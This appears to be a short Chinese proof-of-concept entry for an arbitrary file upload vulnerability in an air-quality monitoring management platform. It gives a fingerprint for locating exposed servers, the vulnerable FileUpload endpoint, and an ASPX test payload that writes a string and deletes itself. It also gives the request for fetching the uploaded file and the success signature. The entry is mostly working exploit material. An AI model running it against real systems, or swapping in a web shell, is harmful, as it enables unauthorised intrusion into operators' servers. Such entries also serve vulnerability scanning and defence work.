# 空气质量检测联网检测管理平台FileUpload存在任意文件上传漏洞

空气质量检测联网检测管理平台 ｜ 文件上传 ｜ —
- **指纹**：`body="/Img/GetImgVerifyChars"`
- **请求**：`POST /Default/FileUpload HTTP/1.1`

**Payload**
```
<%@ Page Language="C#" %>
<% Response.Write("hello,world"); %>
<% System.IO.File.Delete(Request.PhysicalPath); %>
上传定位
GET /{{shellPath}} HTTP/1.1
Host: [www.yousite.com](http://www.yousite.com" \t "_new)
```
- **响应特征**：200 editorUploadFiles